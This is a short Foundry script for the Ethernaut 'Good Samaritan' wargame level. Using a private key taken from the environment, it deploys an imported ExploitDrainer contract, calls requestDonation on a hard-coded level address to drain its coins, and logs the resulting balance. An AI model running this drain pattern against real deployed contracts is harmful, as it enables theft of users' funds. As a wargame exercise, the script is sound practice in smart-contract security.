// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;
import "forge-std/Script.sol";

import {ExploitDrainer, GoodSamaritan, Coin} from "./../../test/ethernaut/donation/Exploit.t.sol";

contract ExploitGatekeeper is Script {
    function run() public {
        uint256 pk = vm.envUint("PK");

        vm.startBroadcast(pk);
        ExploitDrainer drainer = new ExploitDrainer();
        GoodSamaritan donator = GoodSamaritan(
            0x183bc9fb1A5a8bc030a346965d49245C7d11A8e0
        );
        drainer.requestDonation(address(donator));
        Coin coin = donator.coin();
        uint256 balance = Coin(coin).balances(address(donator.wallet()));
        console.log("Donator Coin Balance: ", balance);
        vm.stopBroadcast();
    }
}
